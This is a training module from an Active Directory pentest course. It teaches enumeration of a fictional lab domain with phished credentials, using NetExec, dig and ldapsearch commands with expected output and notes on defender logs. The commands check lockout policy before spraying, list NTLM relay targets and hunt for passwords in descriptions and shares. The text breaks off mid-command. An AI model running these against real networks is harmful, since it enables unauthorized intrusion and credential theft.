# Module 01: Domain Enumeration and Situational Awareness

## What This Module Covers

You have a lab. The domain controller is running. The workstation is joined. Kali is on the same network. Now what?

This module teaches you the first thing a real attacker does after landing inside a network: figure out what is around them. This is called enumeration, and it is the single most important skill in Active Directory pentesting. Exploitation is flashy, but enumeration is what makes exploitation possible. You cannot attack what you do not understand.

By the end of this module you will have:

- Mapped every user, group, computer, and service account in the orsubank.local domain
- Discovered which accounts are Kerberoastable, which are AS-REP Roastable, and which have dangerous permissions
- Found delegation misconfigurations, certificate authority servers, and SMB signing gaps
- Used BloodHound to visualize attack paths that are invisible to manual enumeration
- Understood what protocols carry your queries, and what defenders see when you run each command

This is not a cheat sheet. Every command comes with an explanation of why you are running it, what protocol is being used underneath, and what the output actually means.

---

## Prerequisites

Before starting this module you need:

- Module 00 completed (lab is built and running)
- DC01 is up and reachable (Windows Server 2022, IP ending in .10)
- WS01 is domain-joined and reachable (Windows 10/11, IP ending in .20)
- Kali Linux is on the same NAT network and can ping both machines
- DNS on Kali is pointed at DC01 (`/etc/resolv.conf` has DC01's IP)

All commands in this module run from **Kali Linux**. You are simulating an attacker who has compromised credentials and has network access to the internal environment.

### Your Credentials

| Field | Value |
|:------|:------|
| Username | `vamsi.krishna` |
| Password | `OrsUBank2024!` |
| Domain | `orsubank.local` |
| Account Type | Standard domain user (Bank Manager) |

This account has no admin privileges. It is a regular employee account. The goal is to see how far a compromised regular user can go.

### Tool Setup

Before we start, make sure NetExec is installed on Kali. NetExec (`nxc`) is the modern replacement for CrackmapExec (`cme`), which was archived and deprecated in December 2023. If you see any old guides or blog posts using `cme` or `crackmapexec`, just replace it with `nxc` or `netexec`. The syntax is identical.

```bash
# Check if NetExec is installed
nxc --version

# If not installed, install it
sudo apt update && sudo apt install -y netexec

# Also verify these tools are available
which ldapsearch       # LDAP queries from Linux
which dig              # DNS queries
which bloodhound-python  # BloodHound data collection from Linux (we will install this later if missing)
```

> **Note on passwords in Bash:** The password `OrsUBank2024!` contains an exclamation mark (`!`). In Bash, `!` triggers history expansion when inside double quotes. Always use **single quotes** around passwords in Bash commands. For example: `-p 'OrsUBank2024!'` not `-p "OrsUBank2024!"`. This will save you hours of debugging.

---

## Our Scenario

Here is the situation. You are playing the role of an attacker who has compromised a legitimate employee's credentials through a phishing email. The employee is Vamsi Krishna, a Bank Manager at ORSU Bank. He clicked a link, entered his corporate password on a fake login page, and now you have his credentials.

You are sitting on your Kali machine, connected to the same network as the bank's internal infrastructure. You can reach the domain controller and the workstation. You have a valid username and password. You have no admin access, no special privileges, and no idea what the domain looks like inside.

Your objective: enumerate the domain, find every attack path available, and build a plan to escalate from a regular bank employee to Domain Admin.

This is how real assume-breach engagements start.

---

## Part 1: The Attacker's Mindset

### How Real Engagements Start

Before we touch a single tool, let us talk about how internal penetration tests actually work in the real world. This context matters because it shapes how you think during enumeration.

**What the client gives you:**

In a typical assume-breach engagement, the client provides:

- **One standard domain user account.** Not an admin. Not a service account. A regular employee account, like a helpdesk person or a marketing analyst. The goal is to answer: "If one of our employees gets phished, how bad can it get?"
- **Network access.** Either a VPN connection, a laptop connected to the corporate network, or remote access to a domain-joined workstation.
- **A scope document.** This tells you what you can and cannot do. Typical restrictions include: no denial-of-service attacks, no touching production databases, stay within specific IP ranges, test only during business hours.

The client does NOT give you admin access. They do NOT give you a map of the network. They do NOT tell you where the Domain Admins are. That is your job to find out.

**What an assume-breach engagement actually tests:**

It is not about finding one vulnerability. It is about answering a business question: "If an attacker compromises one of our regular employees, can they reach our critical assets? How far can they go? How fast? Would we detect it?"

### The Mental Checklist

Experienced pentesters do not just fire up tools randomly. They follow a mental decision tree. Here is the order of operations:

```
Step 1: Who am I?
    What user am I? What groups am I in? What privileges do I have?

Step 2: Where am I?
    What network am I on? What DNS servers am I using? What domain is this?

Step 3: What defenses exist?
    Is there EDR/antivirus? What logging is enabled? Is anyone watching?

Step 4: What does the domain look like?
    How many users? What groups exist? Where are the Domain Admins?

Step 5: What can I attack?
    Kerberoastable accounts? AS-REP Roastable? ACL misconfigurations?
    Delegation issues? Certificate misconfigurations?

Step 6: What is the plan?
    Which attack path is shortest? Which is quietest? What is priority 1?
```

We will follow this exact order in this module.

### What NOT to Do

Before we start, here is what beginners do wrong. Learn from their mistakes.

**1. Do not run a full network Nmap scan.**
Running `nmap -sV -sC 10.0.0.0/24` from minute one is the loudest thing you can do. It sends thousands of packets to every host, probing hundreds of ports. Any decent IDS/IPS will flag this instantly. Any SOC analyst watching the dashboard will see a spike. You do not need to port-scan the entire network when you have domain credentials. Active Directory will tell you where everything is if you just ask politely via LDAP.

**2. Do not download and run tools from disk.**
Dropping `mimikatz.exe` or `SharpHound.exe` onto a workstation's desktop and double-clicking it is how you get caught in 30 seconds. Modern EDR solutions have signatures for every well-known offensive tool. They also do behavioral analysis, so renaming the file does not help. In this module we run everything from Kali, which avoids this problem entirely.

**3. Do not spray passwords without checking the lockout policy.**
If the domain has a lockout threshold of 3 attempts, and you spray a password across 500 users, you just locked out 500 employees. The entire IT department is now on the phone. Your engagement is over. Always check the password policy first. Always.

**4. Do not run BloodHound with aggressive settings.**
Running SharpHound with `-CollectionMethod All` from a workstation sends LDAP queries to the domain controller AND SMB/RPC connections to every single computer in the domain. On a 5,000-seat network, that is 5,000 outbound connections from one workstation in a few minutes. That is extremely visible.

**5. Do not enumerate without understanding what logs you create.**
Every LDAP query, every SMB connection, every Kerberos ticket request generates telemetry somewhere. If you do not know what Event IDs your actions produce, you cannot assess your risk of being detected. We will cover this in Part 7.

---

## Part 2: How Active Directory Communicates

Before you run a single enumeration command, you need to understand what is happening underneath. When you type `nxc smb 192.168.1.10 -u user -p pass --shares`, what actually happens on the wire? What protocol is used? What port? What does the domain controller see?

If you skip this section, you will be a tool operator. If you read it, you will be a pentester.

### The Protocol Map

Active Directory is not one protocol. It is a collection of protocols working together. Here are the ones that matter for enumeration:

| Protocol | Port | What It Does (Real-World Analogy) |
|:---------|:-----|:----------------------------------|
| **LDAP** | 389 | The search engine of AD. When you look up a user, check group memberships, or find computers, you are sending LDAP queries. Think of it as Google for your company's directory. |
| **LDAPS** | 636 | Same as LDAP but encrypted with TLS. Like using HTTPS instead of HTTP. |
| **Kerberos** | 88 | The authentication system. When you log into a domain-joined computer, Kerberos handles the tickets that prove your identity. Think of it as the bouncer at a club who checks your ID and gives you a wristband. |
| **DNS** | 53 | Name resolution and service discovery. When a computer needs to find a domain controller, it asks DNS. Think of it as the phone book that tells you "the domain controller is at 192.168.1.10." |
| **SMB** | 445 | File sharing and remote management. When someone in your office creates a shared folder on their computer so the team can access files (instead of emailing them or using WhatsApp), that shared folder works over SMB. In AD, it also carries remote procedure calls for managing users, services, and sessions. |
| **RPC** | 135 + dynamic | Remote function calls. When one computer needs to execute a command on another computer (like "tell me who is logged in right now"), it uses RPC. Port 135 is the directory that says "the service you want is on port 49152." |
| **WinRM** | 5985/5986 | PowerShell remoting. When an IT admin opens a remote PowerShell session to manage a server, that traffic goes over WinRM. It is the modern replacement for older remote management tools. |
| **Global Catalog** | 3268 | A special LDAP port that searches across the entire forest (all domains), not just the local domain. Useful when a company has multiple domains. |

### What Happens When You Log Into a Domain Computer

Let us trace what happens step by step when an employee sits down at their workstation and types their username and password. This will make everything else in this module click.

**Step 1: The workstation asks DNS for a domain controller.**

The workstation does not have the domain controller's address memorized. It queries DNS for a special record called an SRV record: `_ldap._tcp.dc._msdcs.orsubank.local`. This record says "the LDAP service on domain controllers is available at DC01.orsubank.local on port 389." This is how the workstation discovers the DC.

Think of it like this: you want to call the bank's customer service, but you do not have the number memorized. You look up "ORSU Bank customer service" in a phone book (DNS), and it tells you the number (DC01's IP address).

**Step 2: The workstation sends a Kerberos request (AS-REQ).**

The workstation takes the password you typed, converts it into a cryptographic hash (without sending the actual password anywhere), and uses that hash to encrypt a timestamp. It sends this encrypted timestamp along with your username to the domain controller on port 88. This is the Kerberos Authentication Service Request (AS-REQ).

Why a timestamp? Because the DC needs proof that you know the password. If you can encrypt a current timestamp with the correct hash, it means you have the right password. The DC decrypts it with its copy of your hash and checks if the timestamp is recent (within 5 minutes). This is called pre-authentication.

**Step 3: The DC sends back a Ticket-Granting Ticket (AS-REP).**

If your credentials check out, the DC sends you back a TGT (Ticket-Granting Ticket). Think of the TGT as a wristband at a theme park. The main gate (the DC) checked your ID (your password) and gave you a wristband (TGT). Now you can go to any ride (any service) and show your wristband to get a ride-specific ticket, without going back to the main gate every time.

The TGT is encrypted with a special account's hash called `krbtgt`. Only the domain controller knows the krbtgt hash, which means only the domain controller can create or validate TGTs. This is the root of trust in the entire domain.

**Step 4: You access resources with service tickets.**

When you open a file share, connect to a printer, or access a web application, the workstation takes your TGT and asks the DC: "I need a ticket for the file server's SMB service." The DC creates a Service Ticket (TGS) encrypted with the file server's password hash, and sends it back. Your workstation presents this ticket to the file server, and the file server lets you in.

You never type your password again. This is Single Sign-On (SSO). One login, and Kerberos handles every subsequent authentication with tickets.

**Why does this matter for enumeration?** Because it means that once you have valid credentials, you can request service tickets for any service in the domain. Any authenticated user can do this. It is by design. And this design is exactly what makes attacks like Kerberoasting possible (we will get to that in Part 5).

### LDAP: The Search Engine of Active Directory

LDAP (Lightweight Directory Access Protocol) is how you query the Active Directory database. AD stores every object (users, computers, groups, organizational units, printers, everything) in a massive hierarchical database. LDAP is the language you use to search it.

**Real-world analogy:** Imagine your company has a massive spreadsheet with every employee's name, department, phone number, job title, manager, office location, and group memberships. LDAP is the search function for that spreadsheet. You can search by name, by department, by job title, or any combination.

**How AD organizes data:**

AD organizes everything into a tree structure. At the top is the domain. Under it are Organizational Units (OUs), which are like folders. Inside those folders are the actual objects (users, computers, etc.).

Every object has a unique address called a Distinguished Name (DN). It looks like a file path, but written backwards:

```
CN=Vamsi Krishna,OU=BankEmployees,DC=orsubank,DC=local
```

This reads: "The user named Vamsi Krishna, inside the BankEmployees folder, in the orsubank.local domain."

- `CN` = Common Name (the object's name)
- `OU` = Organizational Unit (the folder)
- `DC` = Domain Component (parts of the domain name)

**LDAP filters:**

When you search LDAP, you use filters. They look strange at first but they are logical:

```
(objectClass=user)                          Find all users
(&(objectClass=user)(department=IT))        Find users in the IT department
(servicePrincipalName=*)                    Find accounts with any SPN set
```

The `&` means AND. The `|` means OR. The `!` means NOT. Filters always start with the operator, then the conditions in parentheses.

We will use these filters throughout the module. You do not need to memorize them now. Just understand the concept.

### Why Any Domain User Can See Almost Everything

This is the single most important thing to understand about AD enumeration.

Active Directory was designed in the late 1990s. The security model at the time was "keep the bad guys outside the network. Once you are inside, you are trusted." The perimeter was the castle wall, and everyone inside was assumed to be friendly.

Because of this, Microsoft made the directory readable by default. Any authenticated user (even the lowest-privilege account in the entire domain) can read:

- **Every user account** and most of their properties (name, email, department, title, last login time, group memberships, whether their password ever expires)
- **Every computer account** (hostname, operating system version, when it last logged in)
- **Every security group** and its full membership list
- **Every Organizational Unit** and its structure
- **Domain trust relationships** (what other domains are connected)
- **DNS records** (if DNS is AD-integrated, which it usually is)
- **Service Principal Names** on accounts (this is what makes Kerberoasting possible)
- **Password policy settings** (minimum length, lockout threshold, complexity requirements)

This is not a vulnerability. This is by design. Applications, printers, login processes, and services all need to query the directory to function. If read access were restricted, every single application in the company would need custom permissions configured manually. That does not scale to thousands of applications.

But from an attacker's perspective, this is a goldmine. One compromised employee account gives you a complete blueprint of the entire domain. Every user, every group, every computer, every relationship. And you get all of this through normal, expected LDAP queries that look identical to what legitimate applications do every second.

### SMB: More Than Just File Sharing

When you think of SMB (Server Message Block), think of shared folders. Your coworker creates a folder called "Project Files" on their computer, shares it with the team, and everyone accesses it through `\\coworker-pc\Project Files` in File Explorer. That traffic goes over SMB on port 445.

But in Active Directory, SMB does much more than file sharing:

**SYSVOL and NETLOGON shares:** Every domain controller automatically creates two special shares. SYSVOL contains Group Policy files (scripts, settings, security configurations that apply to all domain computers). NETLOGON contains logon scripts. Every domain-joined computer connects to these shares when it boots up or when a user logs in. This is normal traffic.

**Named pipes for remote management:** Inside an SMB session, you can open virtual channels called "named pipes." These pipes carry remote procedure calls (RPC) that let you manage things remotely:

- `\pipe\samr` is the Security Account Manager. It handles user and group management. When you run `net user /domain`, the request travels through this pipe.
- `\pipe\lsarpc` is the Local Security Authority. It handles security policies and translating between usernames and SIDs (Security Identifiers).
- `\pipe\svcctl` is the Service Control Manager. It lets you start, stop, and create services on remote machines. Tools like PsExec use this.
- `\pipe\srvsvc` is the Server Service. It handles share enumeration and session tracking. When you ask "who is logged into this machine right now?", the request goes through this pipe.

**SMB signing:** This is a security feature that adds a digital signature to every SMB message. Without signing, an attacker can intercept SMB traffic and modify it (relay attacks). Domain controllers enforce SMB signing by default, but regular workstations and member servers typically do not. This is why checking SMB signing status across the network is one of the first things we do during enumeration.

### DNS: The Phone Book That Reveals Everything

DNS (Domain Name System) in Active Directory is not just name resolution. It is the service discovery mechanism for the entire domain. When a workstation needs to find a domain controller, it does not broadcast on the network yelling "WHERE IS A DC?" It asks DNS.

Active Directory registers special DNS records called SRV (Service) records. These records say "this service is available at this hostname on this port." The key ones are:

- `_ldap._tcp.dc._msdcs.orsubank.local` tells you where the LDAP service runs (on domain controllers)
- `_kerberos._tcp.dc._msdcs.orsubank.local` tells you where the Kerberos KDC runs (also on domain controllers)
- `_gc._tcp.orsubank.local` tells you where Global Catalog servers are

As an attacker, you can query these records to discover every domain controller in the environment without scanning a single port. Just ask DNS.

In most AD environments, DNS is "AD-integrated," meaning DNS records are stored inside the AD database itself. This means DNS records are replicated automatically as part of AD replication, and any authenticated user can query them via LDAP (even if traditional DNS zone transfers are blocked).

### NTLM: The Dangerous Fallback

Kerberos is the default authentication protocol in AD. But sometimes Kerberos cannot be used. Maybe the client is connecting by IP address instead of hostname (Kerberos needs hostnames to work). Maybe the target is not domain-joined. Maybe a legacy application forces NTLM. In these cases, Windows falls back to NTLM.

NTLM works like this:

1. You say "I want to log in" (Negotiate)
2. The server sends you a random challenge number (Challenge)
3. You encrypt the challenge with your password hash and send it back (Response)
4. The server (or a DC) does the same calculation and compares results

The critical thing about NTLM is that the **hash itself is the credential**. The protocol uses the hash to encrypt the challenge. It never needs the actual plaintext password. This means if an attacker steals your password hash from memory or a database, they can use it directly to authenticate. They do not need to crack it first. This is called Pass-the-Hash, and it is one of the most common lateral movement techniques in AD.

NTLM also has a design flaw that enables relay attacks. When you authenticate to a server via NTLM, the challenge-response does not cryptographically prove which server you intended to authenticate to. An attacker can intercept your authentication and forward (relay) it to a different server. The second server accepts it because the challenge-response is valid. The attacker now has an authenticated session on the second server as you.

The primary defense against relay is SMB signing (which binds the authentication to a specific connection) and disabling NTLM entirely (forcing Kerberos everywhere).

---

## Part 3: Situational Awareness (The First 5 Minutes)

Now we start hands-on. Every command in this section answers one of two questions: "Who am I?" and "Where am I?" We are establishing our foothold context before doing anything aggressive.

Replace `<DC_IP>` with your DC01's actual IP address (the one ending in .10, for example `192.168.138.10`). Replace `<SUBNET>` with your subnet (for example `192.168.138`).

### Lab Exercise 1: Verify Your Credentials Work

The very first thing you do with compromised credentials is confirm they are valid. Do not assume anything. Test them.

```bash
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!'
```

**Expected output (something like this):**
```
SMB  192.168.138.10  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:orsubank.local) (signing:True) (SMBv1:False)
SMB  192.168.138.10  445  DC01  [+] orsubank.local\vamsi.krishna:OrsUBank2024!
```

**What just happened under the hood:**

1. NetExec connected to DC01 on **port 445 (SMB)**
2. It performed an SMB handshake and gathered the server's information (hostname, domain, OS version, signing status, SMB version)
3. It then authenticated using **NTLM** (since we connected by IP address, not hostname, Kerberos was not used)
4. The `[+]` means authentication succeeded. The credentials are valid.

**What to look for in this output:**

| Field | What It Tells You |
|:------|:-----------------|
| `Windows Server 2022 Build 20348` | The OS version. Useful for knowing what patches and features are available. |
| `name:DC01` | The computer name. This is a domain controller. |
| `domain:orsubank.local` | Confirms the domain name. |
| `signing:True` | SMB signing is enforced. This means you CANNOT relay NTLM authentication to this host. Domain controllers enforce signing by default. |
| `SMBv1:False` | SMBv1 is disabled. Good for security, means EternalBlue will not work here. |
| `[+]` | Credentials are valid. If you saw `[-]`, the password is wrong or the account is locked/disabled. |

**Important:** If you see `(Pwn3d!)` after the credentials, it means your user has local administrator access on that host. For vamsi.krishna against DC01, you should NOT see this. He is a regular user.

> **Protocol used:** SMB (port 445) with NTLM authentication
> **What defenders see:** Event ID 4624 (Successful Logon, Type 3 - Network) on DC01's Security log

### Lab Exercise 2: DNS Reconnaissance

Before scanning anything, ask DNS where the important things are. DNS is the quietest way to discover infrastructure.

```bash
# Find all Domain Controllers via SRV records
dig @<DC_IP> _ldap._tcp.dc._msdcs.orsubank.local SRV
```

**Expected output (the important part):**
```
;; ANSWER SECTION:
_ldap._tcp.dc._msdcs.orsubank.local. 600 IN SRV 0 100 389 dc01.orsubank.local.
```

This tells you: "The LDAP service for domain controllers is available at `dc01.orsubank.local` on port 389, with priority 0 and weight 100." In our lab there is only one DC. In a real enterprise, you might see 5, 10, or 50 DCs listed here.

```bash
# Find Global Catalog servers (forest-wide search capability)
dig @<DC_IP> _gc._tcp.orsubank.local SRV

# Find Kerberos KDC (Key Distribution Center)
dig @<DC_IP> _kerberos._tcp.dc._msdcs.orsubank.local SRV

# Basic domain name resolution
nslookup orsubank.local <DC_IP>

# Reverse lookup (IP to hostname)
nslookup <DC_IP> <DC_IP>
```

**Why this matters:** You now know every domain controller in the environment without sending a single port scan. DNS queries are the quietest form of reconnaissance because they look identical to normal workstation traffic. Every domain-joined computer makes these exact same queries during normal operation.

> **Protocol used:** DNS (port 53, UDP)
> **What defenders see:** Almost nothing. DNS queries to internal DNS servers are baseline traffic. Unless the organization has specific DNS query logging (rare for internal DNS), this is invisible.

### Lab Exercise 3: Get the Domain Password Policy

This is CRITICAL. If you ever plan to try password spraying (testing one password across many accounts), you MUST know the lockout policy first. Getting this wrong locks out real employees and ends your engagement.

```bash
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --pass-pol
```

**Expected output (key fields):**
```
SMB  192.168.138.10  445  DC01  [+] Dumping password info for domain: orsubank.local
SMB  192.168.138.10  445  DC01  Minimum password length: 7
SMB  192.168.138.10  445  DC01  Password history length: 24
SMB  192.168.138.10  445  DC01  Maximum password age: 42 days
SMB  192.168.138.10  445  DC01  Password Complexity Flags: 000001
SMB  192.168.138.10  445  DC01  Minimum password age: 1 day
SMB  192.168.138.10  445  DC01  Account Lockout Threshold: 0
SMB  192.168.138.10  445  DC01  Account Lockout Duration: 30 minutes
```

**What to look for:**

| Field | Why It Matters |
|:------|:--------------|
| Minimum password length | Tells you how short passwords can be. If it is 7, people might use simple 7-character passwords. |
| Account Lockout Threshold | **This is the most critical field.** If it is 0, there is NO lockout. You can spray passwords without locking anyone out. If it is 3, you get 3 tries before the account locks. Stay well below this number (1 attempt per spray round). |
| Account Lockout Duration | How long an account stays locked. If it is 30 minutes, you need to wait 30 minutes between spray rounds. |
| Password Complexity Flags | Whether the domain requires complex passwords (uppercase + lowercase + number + special character). |

**What just happened under the hood:** NetExec connected to DC01 via SMB and opened the `\pipe\samr` named pipe. Through this pipe, it called the SAMR (Security Account Manager Remote) interface to query the domain's password policy settings. This is a legitimate operation that many management tools perform.

> **Protocol used:** SAMR RPC over SMB (port 445, named pipe `\pipe\samr`)
> **What defenders see:** Event ID 4624 (Network Logon) on DC01. The SAMR query itself is not logged as a specific event in default configurations.

### Lab Exercise 4: Check for Null Sessions

A null session is an unauthenticated SMB connection. In old Windows versions (2003 and earlier), null sessions could enumerate users, shares, and more. Modern systems block this by default, but it is always worth checking because misconfigurations happen.

```bash
# Try null session authentication
nxc smb <DC_IP> -u '' -p ''

# Try to list shares without credentials
nxc smb <DC_IP> -u '' -p '' --shares

# Try to get password policy without credentials
nxc smb <DC_IP> -u '' -p '' --pass-pol
```

In our lab, these should fail with `[-]` (access denied). But in real engagements, you occasionally find servers that allow null sessions, especially older file servers, print servers, and legacy applications. It costs nothing to check.

> **Protocol used:** SMB (port 445) with anonymous/null authentication
> **What defenders see:** Event ID 4625 (Failed Logon) if authentication is rejected

### Lab Exercise 5: Network Host Discovery and SMB Signing Check

Now let us find every host on the network. Instead of an Nmap scan (which probes hundreds of ports per host), we will use NetExec to probe only SMB (port 445). This is much quieter and gives us exactly the information we need.

```bash
# Discover all hosts on the subnet with SMB open
nxc smb <SUBNET>.0/24
```

**Expected output:**
```
SMB  192.168.138.10  445  DC01   [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:orsubank.local) (signing:True) (SMBv1:False)
SMB  192.168.138.20  445  WS01   [*] Windows 10/11 Build 19045 x64 (name:WS01) (domain:orsubank.local) (signing:False) (SMBv1:False)
```

**Key observation:** DC01 has `signing:True` and WS01 has `signing:False`. This means:

- **DC01 cannot be targeted with NTLM relay attacks** (signing is required, the attacker cannot forge signatures)
- **WS01 CAN be targeted with NTLM relay attacks** (signing is not required, the attacker can relay authentication to this host)

This is a real finding. In a pentest report, this goes in the findings section. SMB signing not being enforced on workstations and member servers is one of the most common misconfigurations in Active Directory environments.

Let us save this information:

```bash
# Generate a list of hosts without SMB signing (potential relay targets)
nxc smb <SUBNET>.0/24 --gen-relay-list relay_targets.txt

# Check what was saved
cat relay_targets.txt
```

This file will be useful later when we cover NTLM relay attacks in Module 08.

> **Protocol used:** SMB (port 445)
> **What defenders see:** Event ID 4624 (Network Logon) on each host that responds. In a large network, rapid sequential SMB connections from one source can trigger behavioral alerts.

---

## Part 4: Domain Reconnaissance (Minutes 5-30)

Now that we know who we are, where we are, and what the password policy looks like, it is time to map the domain. We are going to enumerate users, groups, computers, and shares. This section answers the question: "What does this domain look like inside?"

### Lab Exercise 6: Enumerate Domain Users

Users are the primary attack surface in AD. You need to know who exists, what their roles are, and which accounts have interesting properties.

```bash
# Enumerate all domain users via LDAP (preferred method - cleaner output, more data)
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --users
```

This queries the domain controller via LDAP (port 389) and returns every user account in the domain. In our lab, you should see all 10 employees plus the service accounts.

```bash
# Show only active (enabled) users
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --active-users
```

This filters out disabled accounts. In real environments, companies often have hundreds of disabled accounts from former employees. You only care about enabled accounts for authentication attacks.

```bash
# Enumerate users via SMB (alternative method - uses SAMR RPC instead of LDAP)
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --users
```

**LDAP vs SMB for user enumeration:** Both give you user lists, but they use different protocols. The LDAP method (`nxc ldap`) queries the directory database directly on port 389. The SMB method (`nxc smb`) opens the `\pipe\samr` named pipe over port 445 and uses the SAMR RPC interface. LDAP typically returns more attributes and is the cleaner method.

```bash
# This is the gold mine: check user descriptions for passwords
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M get-desc-users
```

**Why check descriptions?** System administrators are human. When they create a service account or reset a password, they sometimes type the password into the Description field so they do not forget it. "Temp password: Summer2024!" sitting in a user description is more common than you would think. This module (`get-desc-users`) searches specifically for this.

> **Protocol used:** LDAP (port 389) or SAMR RPC over SMB (port 445)
> **What defenders see:** LDAP queries are baseline AD traffic and typically not logged individually. SAMR queries generate Event ID 4624 (Network Logon). High-volume LDAP queries from a single source may trigger alerts if the organization uses Microsoft Defender for Identity (MDI).

### Lab Exercise 7: Enumerate Domain Groups

Groups define who has access to what. In Active Directory, privileges are almost always assigned through group memberships rather than directly to individual users.

```bash
# List all domain groups
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --groups
```

**What to look for in the output:**

- **Domain Admins:** Members of this group have full control over the entire domain. These are your primary targets.
- **Enterprise Admins:** Even more powerful. Full control over the entire forest (all domains). In our single-domain lab, this is the same as Domain Admins.
- **IT_Admins, Server_Admins, IT_Support, HelpDesk_Team:** These are custom groups created by the organization. They might be nested inside privileged groups (we will discover this with BloodHound).
- **Backup Operators, Account Operators, Server Operators:** Built-in groups with dangerous permissions that people often overlook.

```bash
# Check a specific user's group memberships
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M groupmembership -o USER='ammulu.orsu'
```

This shows you what groups `ammulu.orsu` belongs to. In our lab, she is the IT Manager and a member of Domain Admins. Try checking other users too:

```bash
# Check your own groups
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M groupmembership -o USER='vamsi.krishna'

# Check the nested chain (try each user in the HelpDesk path)
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M groupmembership -o USER='harsha.vardhan'
```

**The nested group problem:** In our lab, there is a chain: `harsha.vardhan` is in `HelpDesk_Team`, which is in `IT_Support`, which is in `Server_Admins`, which is in `Domain Admins`. This means harsha.vardhan is effectively a Domain Admin, even though he is not directly in the Domain Admins group. This kind of nested chain is invisible to simple `net group "Domain Admins" /domain` queries. You need BloodHound (Part 6) to see it clearly.

> **Protocol used:** LDAP (port 389)
> **What defenders see:** Standard LDAP search queries. Not logged individually by default.

### Lab Exercise 8: Enumerate Domain Computers

Computer accounts tell you what machines exist in the domain, what operating systems they run, and potential targets for lateral movement.

```bash
nxc ldap <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --computers
```

In our lab, you should see:
- **DC01** running Windows Server 2022 (the domain controller)
- **WS01** running Windows 10 or 11 (the workstation)

In a real enterprise, this list might have thousands of entries. You would look for:
- Old operating systems (Windows Server 2012, Windows 7) that are likely unpatched
- Servers with interesting names (SQL01, EXCHANGE, FILESERVER, BACKUP)
- Computer accounts with unusual configurations (delegation, SPNs)

> **Protocol used:** LDAP (port 389)
> **What defenders see:** Standard LDAP search query. Not individually logged.

### Lab Exercise 9: Enumerate SMB Shares

Shares are folders that computers make available over the network. They are one of the most common places to find sensitive information like configuration files, scripts with hardcoded passwords, database backups, and internal documentation.

```bash
# List shares on DC01
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --shares
```

**Expected output (something like this):**
```
SMB  192.168.138.10  445  DC01  [+] orsubank.local\vamsi.krishna:OrsUBank2024!
SMB  192.168.138.10  445  DC01  [*] Enumerated shares
SMB  192.168.138.10  445  DC01  Share        Permissions  Remark
SMB  192.168.138.10  445  DC01  -----        -----------  ------
SMB  192.168.138.10  445  DC01  ADMIN$                    Remote Admin
SMB  192.168.138.10  445  DC01  C$                        Default share
SMB  192.168.138.10  445  DC01  IPC$         READ         Remote IPC
SMB  192.168.138.10  445  DC01  NETLOGON     READ         Logon server share
SMB  192.168.138.10  445  DC01  SYSVOL       READ         Logon server share
```

**What each share means:**

| Share | What It Is | Why It Matters |
|:------|:-----------|:---------------|
| `ADMIN$` | Points to `C:\Windows`. Only accessible to administrators. | If you can read this, you have admin access. |
| `C$` | The entire C: drive. Only accessible to administrators. | Same as above. |
| `IPC$` | Inter-Process Communication. Not a real file share. | Used for RPC communication (named pipes). Always shows READ for authenticated users. |
| `NETLOGON` | Contains logon scripts. Readable by all domain users. | May contain scripts with hardcoded passwords, server names, or mapped drive paths. |
| `SYSVOL` | Contains Group Policy files. Readable by all domain users. | May contain Group Policy Preferences (GPP) XML files with encrypted passwords. Microsoft published the decryption key in 2014, so these are trivially crackable. |

```bash
# Also check WS01
nxc smb <WS_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --shares

# Spider shares for interesting files (automated search)
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' -M spider_plus
```

The `spider_plus` module crawls through accessible shares looking for files with interesting extensions (.txt, .xml, .config, .ps1, .bat, .kdbx, etc.) and creates a JSON report. This can find configuration files, password databases, and scripts that contain credentials.

> **Protocol used:** SMB (port 445). Share enumeration uses the NetShareEnum API via the `\pipe\srvsvc` named pipe.
> **What defenders see:** Event ID 5140 (Network Share Access) and Event ID 5145 (Detailed File Share) if advanced audit policies are enabled. These are not enabled by default.

### Lab Exercise 10: Session Hunting

Session hunting means finding out which users are currently logged into which computers. This is important because if a Domain Admin is logged into a machine you can compromise, you can steal their credentials from memory.

```bash
# Check active sessions on DC01
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --sessions

# Check who is logged on to DC01
nxc smb <DC_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --loggedon-users

# Check WS01 too
nxc smb <WS_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --sessions
nxc smb <WS_IP> -u 'vamsi.krishna' -p 'OrsUBank2024!' --loggedon-users
```

**What just happened under the hood:** NetExec connected to each host via SMB and called two Windows APIs through named pipes:

- `NetSessionEnum` (via `\pipe\srvsvc`): Returns active SMB sessions (who is connecting to this machine remotely)
- `NetWkstaUserEnum` (via `\pipe\wkssvc`): Returns interactively logged-on users (who is sitting at this machine or has an RDP session)

**Important caveat:** Starting with Windows Server 2016 and Windows 10 version 1607, Microsoft restricted `NetSessionEnum` by default. Only administrators and specific groups can query session information on modern systems. In our lab, Defender is disabled and permissions are relaxed, so this should work. In a real engagement, you might get "access denied" on hardened systems.

> **Protocol used:** RPC over SMB (port 445, named pipes `\pipe\srvsvc` and `\pipe\wkssvc`)
> **What defenders see:** Event ID 4624 (Network Logon) on each target. The RPC calls themselves are not logged as specific events by default, but EDR solutions monitor for rapid session enumeration across many hosts.

### Lab Exercise 11: Manual LDAP Queries from Kali

NetExec is great for quick enumeration, but sometimes you need more control. The `ldapsearch` tool lets you write custom LDAP queries that return exactly the attributes you want.

```bash
# Find all domain users and their key attributes
ldapsearch -x -H ldap://<DC_IP> -D "vamsi.krishna@orsubank.local" -w 'OrsUBank2024!' \
